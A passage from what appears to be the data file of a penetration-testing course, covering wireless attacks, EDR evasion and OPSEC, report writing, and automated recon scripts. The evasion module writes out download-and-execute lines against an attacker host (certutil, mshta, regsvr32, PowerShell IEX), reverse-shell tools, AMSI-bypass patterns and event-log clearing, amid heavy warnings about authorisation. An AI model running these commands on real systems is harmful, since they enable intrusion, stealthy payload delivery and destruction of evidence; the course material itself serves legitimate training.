#   bettercap      - wifi.recon on ; wifi.deauth ; set wifi.ap.ssid ...
sudo bettercap -iface wlan0mon
#   bettercap > wifi.recon on
#   bettercap > wifi.show
#   bettercap > set wifi.ap.ssid FreeWifi ; wifi.ap on
\`\`\`

\`\`\`bash
# --- Enterprise / 802.1X (the interesting corporate case) ---
# The finding is usually a missing/ignored server certificate on the client:
# clients that do not validate the RADIUS cert can be tricked into handing over
# MSCHAPv2 challenge/response -> offline crack to a plaintext password -> domain account.
sudo apt install hostapd-mana eaphammer
eaphammer --interface wlan0mon --creds --auth wpa-eap --essid CORP-WIFI
hashcat -m 5500 mschapv2.txt /usr/share/wordlists/rockyou.txt    # NetNTLMv1 = instant, v2 = slow
\`\`\`

\`\`\`text
--- WPA3: what changed ---
WPA3-Personal uses SAE (Dragonfly) -> offline dictionary attacks on the handshake DO NOT WORK.
   Attacks against it are largely side-channels (timing/cache) and downgrade-to-transition-mode.
WPA3-Enterprise (192-bit) with proper cert validation is genuinely strong.
Transition mode (WPA2/WPA3 mixed) is the practical weakness - it keeps WPA2 attackable.
The real-world 2026 picture: WPA2-PSK is still everywhere in SMBs, and it is still the finding.
\`\`\`

\`\`\`bash
# --- other RF worth having in your mental model ---
# Bluetooth:    bluetoothctl ; bettercap bt.recon ; BLE sniffing with a Nordic sniffer
# RFID/NFC:     proxmark3 (125kHz + 13.56MHz), mfoc/mfcuk (MIFARE Classic), ChameleonMini
# SDR:          rtl-sdr, gnuradio, Universal Radio Hacker - key fobs, sensors, pagers
# Zigbee/ZWave: KillerBee, Apimote
# All of these are "own hardware, own lab" territory, same as WiFi.
\`\`\`

>! A rogue AP broadcasting your target\'s SSID causes clients to disconnect from the real network. That is a service outage and, with the right (wrong) framing, an intercept of communications. Scope documents must explicitly name SSIDs, physical locations, times, and the fact that client devices will be disrupted. If it does not say that, do not do it.

>= Where wireless testing actually earns its fee is in the *coverage* analysis: drive or walk the site, record signal strength at the perimeter and in the car park, and report "this access point is usable from outside the building at -62 dBm". Executives act on that sentence.`}
  ],
  keyIdeas:[
    'Radio crosses property lines: practise only on your own kit or an explicitly scoped site.',
    'Chipset decides everything — AR9271 or RTL8812AU. Check before you buy.',
    'PMKID beats handshake capture: no deauth, no denial of service, often faster.',
    'The finding is not the cracked PSK; it is flat layer-2 access, shared PSKs, missing 802.1X/NAC.',
    'WPA3-SAE resists offline cracking; transition mode keeps WPA2 attackable.',
    'Deauth and rogue APs are denial-of-service. In writing, with time windows, or not at all.'
  ],
  tools:['t-aircrack','t-bettercap','t-wifite','t-hcxtools','t-wireshark'],
  labs:['lab-wireless'],
  xp:150
},

/* ---------------------------------------------------------------- 12 ---- */
{
  id:'m12', n:'12', phase:'POST', title:'Evasion, OPSEC & the EDR Reality',
  blurb:'What actually gets caught: AV/EDR behaviour detection, AMSI and script logging, living-off-the-land, obfuscation that helps versus theatre, and how to operate without leaving obvious traces.',
  why:'Modern defensive tooling flags behaviour, not filenames — which invalidates most 2015-era evasion advice. Knowing what defenders actually see makes you a better attacker and a far more employable defender.',
  lessons:[
    { t:'Understand what you are up against', body:`\`\`\`text
TOOL        WHAT IT DOES                                        WHAT DEFEATS NAIVE ATTACKS
AV          signature + heuristics on files, on write and exec  msfvenom default payloads, the entire
                                                                ancient "encoder x5" trick
EDR         kernel callbacks: process trees, LSASS access,     anything that spawns cmd.exe from
            credential access, injection, persistence APIs      Word, dumps lsass, or calls
                                                                CreateRemoteThread. Behaviour, not bytes.
AMSI        scans PowerShell/.NET content IN MEMORY before     plaintext download-and-iex, unencoded
            execution                                           Invoke-Mimikatz pasted from the internet
ScriptBlock logging  records every PS script block to the      any PowerShell that touches credentials
                     event log (4104) - full text
Sysmon      process creation with command line, network conns,  your reverse shell's exact arguments
            file writes, registry keys - the analyst's favourite
NIDS        network signatures, beacon detection, JA3/JA4 TLS   default C2 profiles with fixed intervals
\`\`\`

**The mental shift:** in 2026 you are not trying to make a file that "AV does not have a signature for". You are trying to perform an action that does not look like an attack **when seen as a chain of events**. Encoders change bytes. Defenders stopped looking at bytes a decade ago.

\`\`\`bash
# --- the attacker's version of "know your lane" ---
# 1. What is actually on the target? Ask before you craft anything:
#    Get-MpComputerStatus            (Defender state, real-time protection)
#    Get-MpPreference | select ExclusionPath, ExclusionProcess
#    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
#    tasklist /svc | findstr /i "edr crowdstrike sentinel cylance carbon"
# 2. Is script logging on?  reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell
# 3. Then choose the least-noisy available primitive.
\`\`\`

>= Evasion in an engagement is a *test of the client's detection capability*, and the most valuable output is not "we bypassed it" but "we bypassed it, here is the exact event your SIEM should have alerted on, and why it did not." That is what gets you called back.`},

    { t:'Living off the land, and doing less', body:`The most reliable evasion is using tools and protocols that are *supposed* to be there. No new binary, no new signature, nothing for the file-based stack to dislike.

\`\`\`bash
# --- LOLBins: signed Windows binaries that can do attacker work ---
certutil -urlcache -f http://10.10.14.7/tool.exe tool.exe    # download (heavily logged now)
bitsadmin /transfer j http://10.10.14.7/tool.exe C:\\Windows\\Temp\\tool.exe
curl.exe -o tool.exe http://10.10.14.7/tool.exe              # Windows 10+ ships curl
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"
regsvr32 /s /n /u /i:http://10.10.14.7/x.sct scrobj.dll      # Squiblydoo (usually blocked now)
mshta http://10.10.14.7/x.hta
rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";...
wmic process call create "cmd.exe /c whoami"                  # deprecated but present
# Full list: lolbas-project.github.io   (Windows)   gtfobins.github.io   (Linux)
\`\`\`

\`\`\`bash
# --- Linux: same idea ---
# file transfer with no extra tools:
base64 -w0 tool | ...        # paste over the shell
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.14.7/t","/tmp/t")'
perl -e 'use LWP::Simple;getstore("http://10.10.14.7/t","/tmp/t")'
# reverse shell without bash -c:  nc -e /bin/sh (if compiled in), socat, awk, curl|sh
# persistence that looks normal:  a systemd unit, a cron entry, an .ssh/authorized_keys
\`\`\`

\`\`\`powershell
# --- PowerShell: obfuscation that is honest about what it is ---
# AMSI sits in-process and scans script text IN MEMORY before execution.
# Known bypass patterns exist (reflection to null the AmsiScanBuffer, "amsi.fail" strings,
#  obfuscating variable names, splitting strings, string reversal) - and they are ALL
#  detected by any modern EDR, because every one of them is itself a known behaviour.
# The only durable approach: DON'T USE POWERSHELL FOR OFFENSIVE ACTIONS.
# Every 4104 ScriptBlock event is a full-text copy of what you ran, in the client's SIEM.
# Prefer: native binaries, a compiled implant you control, or non-PS languages.
\`\`\`

\`\`\`text
--- what actually reduces noise, in order of impact ---
1. DO LESS. Every command is logged. Fewer actions = fewer alerts = fewer findings for the client's SOC.
2. Use the network's own protocols instead of new binaries (DCOM/WMI/WinRM/LDAP rather than a dropped exe).
3. Long, jittered beacon intervals over short fixed ones (a 1-second fixed-interval C2 is a gift to the NIDS).
4. Legitimate-domain C2 with a real TLS cert and a redirector, never a bare VPS IP.
5. Match the target environment: use the same JA3 fingerprint, User-Agent and DNS patterns as normal traffic.
6. Clean up what you dropped, and write down what you dropped in your notes (so you can remove it all).
\`\`\`

>! Do not chase "undetectable". You will not be undetectable, and a false belief that you are leads to sloppy actions that generate alerts. The professional posture is "I assume every action is logged; I am testing whether they *detect* and *respond*." That framing is honest, it is what the client is paying for, and it survives a debrief.`},

    { t:'OPSEC for yourself, not just the target', body:`\`\`\`bash
# --- protect your own infrastructure and identity ---
# 1. Separate infrastructure: never attack from an IP that is also your VPN/email/personal machine.
# 2. Dedicated VPS per engagement, torn down afterwards, paid appropriately.
# 3. Never reuse C2 domains across clients - cross-engagement correlation is a real failure mode.
# 4. Check what your tooling leaks by default:
\`\`\`

\`\`\`bash
# --- leak audit of your own traffic ---
sudo tcpdump -i any -nn port 53          # is anything resolving to your home IP?
ss -tunp                                  # what is calling out right now?
nmap -sV -p- 10.10.14.7 --script=banner   # what does YOUR exposed VPS look like to the target?
# get your egress IP and check it is what you think it is:
curl -s https://ifconfig.me; echo
anonsurf myip                             # Parrot: confirm Tor egress actually changed
\`\`\`

\`\`\`bash
# --- metadata hygiene: everything you hand over is evidence ---
# Clean metadata from screenshots and documents before they reach a report:
exiftool -all= -overwrite_extension .png evidence/*.png
# Mind what is IN the screenshot: your terminal prompt, your IP in the header bar,
# other tabs, browser bookmarks, the client's data you did not need to see.
# Redact with real tools, not a black rectangle drawn in an image editor:
pdftoppm -png report.pdf p; # then edit; or use \`redact\`/ImageMagick with a filled box + no layers
\`\`\`

\`\`\`bash
# --- clearing up after yourself (and documenting that you did) ---
# List everything you planted, by path, with a timestamp - then remove all of it:
#   /tmp/*.elf, /tmp/linpeas.sh, /dev/shm/*, C:\\Windows\\Temp\\*, scheduled tasks,
#   systemd units, cron entries, new users, added .ssh/authorized_keys, services
# In Metasploit: meterpreter \`clearev\` clears the Windows event log.
#   !!! It is a SERVICE OUTAGE of log data and the client must approve it in writing. !!!
#   Removing evidence from a production system destroys the client's incident data.
#   Most professional engagements DO NOT do this - they report what was placed and let
#   the client remove it. Ask first; assume "no".
\`\`\`

\`\`\`text
--- the OPSEC questions to ask yourself before every action ---
  Is this within the agreed scope and technique list?
  Will this be logged, and is that acceptable to the client?
  Could this disrupt a user or a service? Have I got that in writing?
  Do I know how to undo it?
  Is it in my notes with a timestamp?
  If I read this back in an incident report tomorrow, does it still look like professional testing?
\`\`\`

>! The strongest OPSEC rule is not technical: **if you cannot explain the action in a report, do not take the action.** Every technique in this module is legitimate in an authorised, scoped engagement and a criminal act outside one. The tooling does not know the difference. You have to.

>= Anyone who tells you "just run this AMSI bypass and you're invisible" is selling 2018. Realistic red teaming is a discipline of reducing signal, controlling scope, and documenting precisely — which is also, not coincidentally, exactly how defenders think. That double fluency is what makes an offensive security professional genuinely valuable.`}
  ],
  keyIdeas:[
    'Defenders detect behaviour and chains of events, not bytes. Encoders are theatre.',
    'Know the defence before crafting: Defender state, EDR present, script logging on.',
    'Living off the land (LOLBins/GTFOBins) is the most reliable quiet technique.',
    'Do less, beacon slowly and jittered, use legitimate domains and real TLS.',
    'Assume every action is logged; test detection and response, not invisibility.',
    'If you cannot explain it in a report, do not do it. Clean up, or get written approval not to.'
  ],
  tools:['t-bettercap','t-msfvenom','t-wireshark','t-git'],
  labs:['lab-opsec'],
  xp:160
},

/* ---------------------------------------------------------------- 13 ---- */
{
  id:'m13', n:'13', phase:'POST', title:'Reporting & the Business Side',
  blurb:'Turn hours of shell history into a document a CTO reads and acts on: structure, risk rating, evidence, reproduction steps, remediation, and the debrief.',
  why:'An engagement that is not reported is an engagement that did not happen. Your report is the actual product you were paid for, and it is the artefact that decides whether you get hired again.',
  lessons:[
    { t:'The report structure that works', body:`\`\`\`text
1. COVER + METADATA
   Client, engagement type, dates, report version, classification, author, distribution list
2. EXECUTIVE SUMMARY  (1-2 pages, written for a non-technical reader)
   - What we were asked to do, in one sentence
   - What we found, in plain language, ranked
   - The single most important thing they should fix first
   - Overall risk posture: one honest sentence. No hedging, no fearmongering.
   - No jargon. If a term needs a footnote, replace the term.
3. FINDINGS  (the body)
   One section per finding. Details below.
4. METHODOLOGY / SCOPE
   What was tested, when, from where, what was excluded, what techniques were used/not used.
   Nmap output file names, dates. This section is also your legal protection.
5. ATTACK PATH / KILL CHAIN NARRATIVE
   The story of how a low finding became total compromise. Executives remember stories.
6. REMEDIATION ROADMAP
   Prioritised, with rough effort and owner type (patch, config, process, architecture).
   Immediate (this week) / Short term (this quarter) / Strategic (this year).
7. APPENDICES
   Raw tool output, credential/hash inventories (redacted), scan XML, checksums.
\`\`\`

Every **finding** follows the same rigid template, because consistency is what makes a report skimmable:

\`\`\`text
F-03  SQL injection in the customer search endpoint
Risk: Critical (CVSS 9.8 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
Affected: https://portal.example.com/search?q=   (app v2.14.1, host 10.10.10.5)

Description            what the flaw is, in two sentences, no tool names
Impact                 what an attacker can actually do. Business consequences:
                       read all customer records, modify orders, pivot to the internal DB
Evidence               annotated screenshot, the exact request/response, the extracted data hash
Reproduction           numbered steps, exact commands, so their engineer can verify in 5 minutes
CVSS + rationale       the number, plus one line on why PR:N and C:H
Remediation            parameterised queries (specify the library API), WAF as interim,
                       plus: audit the whole codebase for the same pattern - this is never one line
References             OWASP, the vendor advisory, the CVE
\`\`\`

**Risk rating must be defensible.** Use CVSS 3.1 or 4.0 for a number, then override with context and *say so*: "CVSS 5.3, raised to High because this host holds 4 million customer records and sits in the flat internal segment." A rating you cannot defend in a debrief is worse than no rating.

>= One good finding written properly beats twenty scanner outputs pasted into a document. If your report is a raw Nessus export, the client could have bought the scanner instead of you.`},

    { t:'Evidence, integrity, and being un-impeachable', body:`You are producing something that may end up in a legal proceeding, an incident review, or an audit. Treat every artefact as evidence.

\`\`\`bash
# --- evidence discipline: hash, timestamp, store, never edit in place ---
mkdir -p ~/engagements/ACME-2026-04/evidence
cd ~/engagements/ACME-2026-04/evidence
# 1. capture, then hash immediately
cp /tmp/sqli-response.html ./F-03-sqli-response.html
sha256sum F-03-sqli-response.html >> ../evidence/CHAIN.txt
# 2. timestamp the whole chain and sign it
date -u >> CHAIN.txt; sha256sum CHAIN.txt
gpg --detach-sign --armor CHAIN.txt          # your key, dated
# 3. screenshots: capture the URL bar, the timestamp, and enough context
#    to prove it is really that system - including the hostname/IP
\`\`\`

\`\`\`bash
# --- the loot inventory: what you took, where it lives, when it gets destroyed ---
cat > loot/INVENTORY.md <<'EOF'
| # | Type            | Value (redacted)      | Source              | Why taken        | Destroy by |
|---|-----------------|-----------------------|---------------------|------------------|------------|
| 1 | local hash      | 8846f7ea...(SHA256)   | lab-win02 SAM       | prove crack path | 2026-06-01 |
| 2 | AD creds        | svc_backup:<redacted> | kerberoast crack    | prove impact     | 2026-06-01 |
| 3 | DB sample       | 50 rows, customer     | portal SQLi         | prove severity   | 2026-05-15 |
EOF
# Never take more data than proves the finding. 50 rows proves it. 4 million does not prove it better,
# and every extra record is extra liability, extra retention, and extra risk for you personally.
\`\`\`

\`\`\`bash
# --- the findings tracker you build as you work (not afterwards) ---
cat > findings.csv <<'EOF'
id,title,risk,cvss,host,endpoint,evidence,remediation,status
F-01,SMB signing disabled,High,7.5,10.10.10.0/24,-,ev/F01-sweep.txt,enforce signing via GPO,confirmed
F-02,Anonymous share exposes backups,Critical,9.1,10.10.10.20,\\\\backup,ev/F02-smbclient.txt,disable anonymous + audit share ACLs,confirmed
F-03,SQLi in /search,Critical,9.8,10.10.10.5,/search?q=,ev/F03-response.html,parameterise + WAF interim,confirmed
EOF
# Write findings as you find them. Reconstructing a week later from shell history
# loses the exact evidence that made the finding provable.
\`\`\`

\`\`\`bash
# --- data handling rules you should already have agreed in writing ---
# * Encryption at rest for loot (age/gpg), never plaintext hashes on a laptop
# * Named storage location, agreed with the client, not your personal cloud
# * Retention date, then destruction, with a certificate of destruction
# * No client data in your notes app, your email, or a chat platform
age -r <client-pubkey> -o loot.enc loot/
\`\`\`

>! A pentester\'s laptop is a high-value target and a legal liability. Full-disk encryption, loot encrypted separately, no client data outside the engagement folder, and a documented destruction date. If your laptop is stolen mid-engagement, an encrypted volume with a retention policy is the difference between a bad week and a notification-triggering breach.

>= Never include a plaintext password, a private key, or unredacted personal data in a report deliverable. The report is often emailed, copied and archived for years — it becomes a new attack surface. Redact to a verifiable prefix plus a hash: \`svc_backup:Z********!\` (SHA256 8846f7ea...).`},

    { t:'The debrief, the client relationship, and pricing your work', body:`**The debrief presentation** is where recommendations get funded. Structure it as a 30-minute conversation, not a document reading.

\`\`\`text
 5 min  What we were asked to do, and what we did (scope, dates, from where)
10 min  The attack path story - one slide, five steps, low finding to domain admin.
        THIS is the slide people remember. Make it a chain, not a list.
10 min  The three things to fix first, with effort and owner. Not twenty things. Three.
 5 min  What went well - genuinely. A client whose defence ACTUALLY caught something
        should hear it. It builds trust and it makes your other findings credible.
 5 min  Questions, and the remediation timeline agreed in the room.
\`\`\`

\`\`\`bash
# --- the re-test: the thing that turns one engagement into a retainer ---
# Offer a re-test of the critical findings after remediation.
# Charge for it. Confirm the fixes with the SAME original commands, so the client
# sees a direct before/after. Example follow-up evidence file:
cat > retest.md <<'EOF'
## Re-test 2026-06-10 - ACME
F-01 SMB signing        BEFORE: signing:False on 12 hosts   AFTER: signing:True on 12 hosts  -> CLOSED
F-02 anonymous share    BEFORE: smbclient -L listed //backup  AFTER: NT_STATUS_ACCESS_DENIED  -> CLOSED
F-03 SQLi /search       BEFORE: 1' AND SLEEP(5) -> 5.02s      AFTER: parameterised, 0.01s, WAF block -> CLOSED
EOF
\`\`\`

\`\`\`text
--- how the work is actually packaged (know your industry) ---
one-off penetration test          fixed scope, fixed price, one report + debrief
retainer                         monthly days, continuous testing, quarterly summary
red team engagement              adversary simulation, stealth, detection-focused, weeks
compliance-driven                PCI-DSS ASV/internal, ISO 27001, SOC 2 - dates are contractual
bug bounty                       per-finding payout; not a substitute for paid engagement work
internal role                    fixed salary, you test your own org, no report theatre
\`\`\`

\`\`\`text
--- the professional habits that compound ---
  Write the executive summary FIRST, before the technical detail. It forces clarity.
  Have a colleague read your findings for "would this be reproducible from what is written?"
  Keep a personal findings library: patterns you have found repeatedly across clients.
  Note the ones that recur ("SMB signing off", "shared local admin password", "no MFA on VPN")
  - those become your standard checklist and your fastest wins on the next engagement.
  Never inflate severity to look impressive. Clients verify, and credibility does not come back.
\`\`\`

>= Best single piece of career advice for this module: the report is where a pentester becomes a consultant. Anyone can run nmap. Almost nobody writes a finding that an engineer can fix from, a CTO can fund, and an auditor will accept.`}
  ],
  keyIdeas:[
    'Structure: exec summary → findings → methodology → attack path narrative → roadmap → appendices.',
    'One finding = description, impact, evidence, reproduction, CVSS + rationale, remediation, refs.',
    'Hash your evidence, timestamp it, never edit in place, and document a destruction date.',
    'Write findings as you go — reconstructing from shell history loses provability.',
    'Debrief in 30 minutes with three priorities and an attack-path story slide.',
    'Redact aggressively. The report itself becomes an attack surface.'
  ],
  tools:['t-markdown','t-git','t-shodan'],
  labs:['lab-report'],
  xp:140
},

/* ---------------------------------------------------------------- 14 ---- */
{
  id:'m14', n:'14', phase:'MASTERY', title:'Customize & Automate Your Arsenal',
  blurb:'The force multiplier: aliases, shell functions, dotfiles in git, tmux workspaces, scripted recon pipelines, Metasploit resource scripts, custom NSE Lua, wordlist automation, and Parrot/Kali system tweaks.',
  why:'Every professional you admire has a personal toolchain they built. This module is how you get one — not by installing more tools, but by wiring the ones you have into workflows that run themselves and log everything.',
  lessons:[
    { t:'Dotfiles: aliases and functions that pay for themselves', body:`Your shell config is a program you run ten thousand times a year. Treat it like code.

\`\`\`bash
mkdir -p ~/.config/zothpen && cat > ~/.config/zothpen/aliases.sh <<'ZEOF'
# ============ ZothPen operator aliases ============
# --- engagement workflow: always log, always save ---
alias ll='ls -lah --color=auto'
alias ports='ss -tulpn'
alias sniff='sudo tcpdump -i any -nn -A'
alias serve='python3 -m http.server'                     # "serve 8000"
alias myip='curl -s https://ifconfig.me; echo'
alias tun='ip -br -4 addr show tun0'                     # VPN address, used constantly

# --- nmap: saved output is the default, never optional ---
alias nmapq='nmap -sV -sC -T4 --open'
alias nmaptcp='nmap -sS -p- --min-rate 2000 -T4 --open'
alias nmapudp='sudo nmap -sU --top-ports 100 --open'

# --- recon helpers ---
alias subs='subfinder -silent -all -d'
alias live='httpx -silent -title -tech-detect -status-code'
alias fuzz='ffuf -c -mc 200,204,301,302,307,401,403 -t 60 -w'

# --- navigation ---
alias eng='cd ~/engagements && ls -t'
alias loot='cd ~/engagements/$(ls -t ~/engagements | head -1)/loot'
alias serve='python3 -m http.server 8000'
ZEOF
echo '[ -f ~/.config/zothpen/aliases.sh ] && . ~/.config/zothpen/aliases.sh' >> ~/.zshrc
\`\`\`

**Shell functions** are where the real leverage is: a function can take arguments, loop, log, and notify.

\`\`\`bash
cat >> ~/.config/zothpen/aliases.sh <<'ZEOF'
# ---- mkeng: scaffold a whole engagement folder ----
mkeng() {
  [ -z "$1" ] && { echo "usage: mkeng <client-YYYY-MM>"; return 1; }
  local d="$HOME/engagements/$1"
  [ -d "$d" ] && { echo "exists: $d"; return 1; }
  mkdir -p "$d"/{recon,scans,loot,evidence,exploits,report}
  cat > "$d/scope.txt" <<EOF
# Engagement: $1
# In scope:
# Out of scope:
# Window:
# Emergency contact:
# Rules of engagement:
EOF
  cp "$HOME/engagements/_template/findings.csv" "$d/findings.csv" 2>/dev/null
  echo "$d" && cd "$d" && tmuxnew "$1" 2>/dev/null
}

# ---- fscan: fast full-TCP scan with all formats saved and a live port summary ----
fscan() {
  [ -z "$1" ] && { echo "usage: fscan <target> [label]"; return 1; }
  local t="$1" lbl="\${2:-$(echo "$1" | tr '/.' '__')}" out="scans/$lbl"
  mkdir -p scans
  echo "[*] full TCP sweep of $t -> $out.{nmap,gnmap,xml}"
  sudo nmap -sS -p- --min-rate 2000 -T4 --open -oA "$out" "$t" | tee -a "scans/$(date +%F).log"
  echo; echo "[+] open ports:"
  grep -Eo '[0-9]+/open/tcp' "$out.gnmap" | cut -d/ -f1 | sort -un | paste -sd,
}

# ---- svcscan: service/version + default scripts on the ports you just found ----
svcscan() {
  local ports=$(grep -Eo '[0-9]+/open/tcp' "$1.gnmap" | cut -d/ -f1 | sort -un | paste -sd,)
  [ -z "$ports" ] && { echo "no ports in $1.gnmap"; return 1; }
  echo "[*] -sV -sC on: $ports"
  sudo nmap -sV -sC -p"$ports" -oA "\${1}-detail" "$(grep -m1 'Host:' "$1.gnmap" | awk '{print $2}')"
}

# ---- webshot: are those web ports actually serving something? ----
webshot() {
  live < "$1" 2>/dev/null     # requires: cat hosts.txt | webshot
}

# ---- logrun: run anything, tee everything, with a timestamped header ----
logrun() {
  local log="$HOME/engagements/$(ls -t ~/engagements | head -1)/scans/$(date +%F-%H%M%S)-cmd.log"
  { echo "### $(date -Is) :: $*"; "$@"; echo "### exit=$?"; } 2>&1 | tee -a "$log"
}
ZEOF
source ~/.config/zothpen/aliases.sh
type fscan; fscan 10.10.10.5 lab-web01
\`\`\`

>= \`logrun\` and \`fscan\` are the two functions that change how a day goes. Everything gets logged without you remembering to log it, and every scan produces \`-oA\` output without you typing \`-oA\` on your third coffee.`},

    { t:'Recon pipelines: chain the tools into one command', body:`The pattern for every good pipeline: **discover → filter → probe → log → report-ready artefact.**

\`\`\`bash
cat > ~/scripts/recon.sh <<'BEOF'
#!/usr/bin/env bash
# recon.sh — passive+active recon pipeline, one target, fully logged
set -uo pipefail
DOMAIN="\${1:?usage: recon.sh <domain> [outdir]}"
OUT="\${2:-recon/$DOMAIN-$(date +%F)}"
mkdir -p "$OUT"
log(){ printf '\\033[1;32m[*]\\033[0m %s\\n' "$*" | tee -a "$OUT/run.log"; }

log "passive subdomain enumeration"
subfinder -d "$DOMAIN" -all -silent            > "$OUT/subs-passive.txt" 2>/dev/null
amass enum -passive -d "$DOMAIN" -silent       > "$OUT/subs-amass.txt"   2>/dev/null
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" \\
  | jq -r '.[].name_value' 2>/dev/null | sed 's/\\*\\.//' > "$OUT/subs-ct.txt"
cat "$OUT"/subs-*.txt | grep -v '^$' | sort -u  > "$OUT/subs-all.txt"

log "probing live hosts ($(wc -l < "$OUT/subs-all.txt") candidates)"
httpx -l "$OUT/subs-all.txt" -silent -title -tech-detect -status-code -o "$OUT/live.txt"
awk '{print $1}' "$OUT/live.txt" | sort -u > "$OUT/urls.txt"

log "resolving and scanning live hosts"
grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}' "$OUT/urls.txt" 2>/dev/null | sort -u > "$OUT/ips.txt"
[ -s "$OUT/ips.txt" ] && sudo nmap -sV -sC -T4 --open -iL "$OUT/ips.txt" -oA "$OUT/nmap" >/dev/null

log "quick web hardening check"
while read -r u; do nikto -h "$u" -maxtime 120s -o "$OUT/nikto-$(echo "$u"|tr -cd 'a-z0-9').txt" >/dev/null 2>&1; done \\
  < <(head -20 "$OUT/urls.txt")

log "done. artefacts in $OUT"
ls -la "$OUT"
echo
echo "NEXT: eyeball $OUT/live.txt, pick targets, then run gobuster/ffuf per host"
BEOF
chmod +x ~/scripts/recon.sh
~/scripts/recon.sh example.com
\`\`\`

\`\`\`python
#!/usr/bin/env python3
"""webpipeline.py — fuzz many hosts, dedupe findings, emit a report table."""
import subprocess, json, sys, pathlib

WORDLIST = "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
OUT = pathlib.Path("fuzz"); OUT.mkdir(exist_ok=True)

def ffuf(url):
    """Run ffuf for one URL, return the hits we care about."""
    of = OUT / f"{url.replace('://','_').replace('/','_')}.json"
    subprocess.run([
        "ffuf", "-u", f"{url}/FUZZ", "-w", WORDLIST,
        "-mc", "200,204,301,302,307,401,403", "-fc", "404",
        "-t", "80", "-s", "-of", "json", "-o", str(of),
    ], check=False)
    if not of.exists(): return []
    data = json.loads(of.read_text() or "{}")
    return [{"url": url, "path": r["input"]["FUZZ"], "code": r["status"],
             "len": r["length"], "words": r["words"]} for r in data.get("results", [])]

def main(hosts_file):
    hits = []
    for line in pathlib.Path(hosts_file).read_text().splitlines():
        url = line.strip()
        if not url: continue
        print(f"[*] {url}", file=sys.stderr)
        hits += ffuf(url)
    # dedupe on path+code, sort interesting-first
    uniq = {(h["path"], h["code"]): h for h in hits}
    rows = sorted(uniq.values(), key=lambda h: (h["code"], h["path"]))
    with (OUT / "summary.md").open("w") as f:
        f.write("| host | path | code | len | words |\\n|---|---|---|---|---|\\n")
        for r in rows:
            f.write(f"| {r['url']} | /{r['path']} | {r['code']} | {r['len']} | {r['words']} |\\n")
    print(f"[+] {len(rows)} unique hits -> {OUT/'summary.md'}")

if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "hosts.txt")
\`\`\`

\`\`\`bash
# --- notification hooks: know when a long job finishes, from anywhere ---
notify() { curl -s -d "ZothPen: $*" https://ntfy.sh/zothpen-lab-engagements >/dev/null; }
fscan 10.10.10.0/24 && notify "fscan done"
# Discord webhook:
notify_discord() { curl -s -H 'Content-Type: application/json' \\
  -d "{\\"content\\":\\"$*\\"}" "$DISCORD_WEBHOOK" >/dev/null; }
long_job | tee out.log; notify_discord "hashcat finished: $(tail -1 out.log)"
\`\`\`

>= Build pipelines in layers and test each layer separately. A 6-stage bash pipeline that silently fails at stage 2 wastes an hour and produces an empty report. \`set -euo pipefail\` plus \`echo\` at each stage boundary costs three minutes and saves the hour.`},

    { t:'Automating the tools themselves', body:`**Metasploit resource scripts** turn a 30-command sequence into one command.

\`\`\`bash
cat > ~/scripts/msf-auto.rc <<'REOF'
# ZothPen auto-pwn resource script:  msfconsole -q -r msf-auto.rc
<ruby>
run_cmd("db_nmap -sV -sC -T4 --open #{framework.datastore['TARGET'] || '10.10.10.5'}")
print_status("#{framework.db.services.count} services in the database")
print_good("Workspace: #{framework.db.workspace.name}")
</ruby>
workspace -a AUTO
services -p 445 -R
use auxiliary/scanner/smb/smb_version
run
use auxiliary/scanner/http/http_version
run
use post/multi/gather/env
REOF
msfconsole -q -r ~/scripts/msf-auto.rc
\`\`\`

\`\`\`ruby
# --- a real Metasploit module (the natural next step) ---
# ~/.msf4/modules/auxiliary/scanner/http/my_check.rb
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super('Name' => 'ZothPen custom HTTP banner check',
          'Description' => 'Flags servers advertising a known-vulnerable build',
          'Author' => 'zoth', 'License' => MSF_LICENSE)
    register_options([OptString.new('BADVER', [true, 'Vulnerable version string', '2.4.49'])])
  end

  def run_host(ip)
    res = send_request_cgi('uri' => '/', 'method' => 'GET')
    if res && res.headers['Server'].to_s.include?(datastore['BADVER'])
      print_good("#{ip}: vulnerable build #{res.headers['Server']}")
      report_vuln(host: ip, name: name, info: res.headers['Server'], refs: ['CVE-2021-41773'])
    end
  end
end
# Drop it in, then:  msfconsole -q -x 'reload_all; use auxiliary/scanner/http/my_check; run'
\`\`\`

**Custom Nmap NSE scripts in Lua** — when you need detection logic that does not exist.

\`\`\`lua
-- ~/.nmap/scripts/zoth-banner.nse   (or /usr/share/nmap/scripts/ for system-wide)
-- Detect an internal-only service and flag its version. Run: nmap --script zoth-banner -sV -p8080 target
local nmap    = require "nmap"
local shortport = require "shortport"
local http    = require "http"
local stdnse  = require "stdnse"

description = [[ZothPen lab probe: fingerprints the internal status endpoint.]]
author      = "zoth"
license     = "Same as Nmap"
categories  = {"discovery", "safe"}

portrule = shortport.port_or_service({8080, 8443}, {"http", "https"})

action = function(host, port)
  local resp = http.get(host, port, "/internal/status")
  if not resp or resp.status ~= 200 then return nil end
  local out = stdnse.output_table()
  out.status  = "reachable"
  out.body_kb = string.format("%.1f", #resp.body / 1024)
  out.server  = resp.header["server"] or "unknown"
  out.note    = "Internal endpoint exposed on a public port - report this"
  return out
end
\`\`\`

**Wordlist automation** — build target-specific lists instead of always reaching for rockyou.

\`\`\`bash
cat > ~/scripts/mkwords.sh <<'WEOF'
#!/usr/bin/env bash
# mkwords.sh <url-or-domain> — build a target-specific wordlist
set -uo pipefail
T="\${1:?usage: mkwords.sh <url-or-domain>}"
OUT="wordlists/\${T//[^a-zA-Z0-9]/_}-$(date +%F).txt"; mkdir -p wordlists
{
  cewl -d 3 -m 5 "$T" 2>/dev/null                 # crawl the site for its own vocabulary
  echo "$T" | sed 's|https\\?://||; s|/.*||'      # domain tokens
  echo "$T" | rev | cut -d. -f1                    # TLD as a token
} > base.tmp
# mangling: the same mutations people actually apply to passwords
